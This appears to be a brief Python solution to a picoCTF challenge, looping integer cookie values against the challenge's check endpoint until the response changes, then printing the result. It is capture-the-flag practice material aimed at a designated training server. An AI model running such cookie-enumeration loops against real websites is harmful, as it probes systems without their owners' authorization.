import requests

i = 0
while True:
    r = requests.get('http://mercury.picoctf.net:54219/check', cookies={'name' : str(i)})
    if "That is a cookie!" not in r.text:
        print(i)
        print(r.text)
        break
    i+=1


